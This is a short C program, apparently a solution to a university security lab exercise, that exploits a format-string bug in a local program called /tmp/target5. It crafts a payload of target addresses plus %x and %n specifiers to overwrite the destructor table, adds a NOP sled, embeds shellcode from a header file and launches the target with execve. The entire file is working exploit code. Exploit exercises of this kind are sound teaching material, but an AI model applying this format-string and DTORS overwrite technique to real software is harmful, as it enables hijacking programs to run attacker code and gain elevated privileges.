#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define SHELLCODE_LEN 45
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];


  // buffer bulding
  char* buff  = malloc(480);
  
  // add the good stuff (that overwrite DTOR) (give it up to 200)
  memcpy(buff, "\xb4\x95\x04\x08JUNK\xb5\x95\x04\x08JUNK\xb6\x95\x04\x08JUNK\xb7\x95\x04\x08JUNK%x%x%x%x%x%x%x%x%134x%n%17x%n", 200);
  
  // set all the NOPs (0->480)
  int i;
  for (i = 200; i < 480; i++){
        buff[i] = NOP; // 'A';//NOP;
  }

  // add the shellcode (at 400)
  char* ptr = buff + 400;

  for(i = 0; i < strlen(shellcode); i++){
    *(ptr++) = shellcode[i];
  }


  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
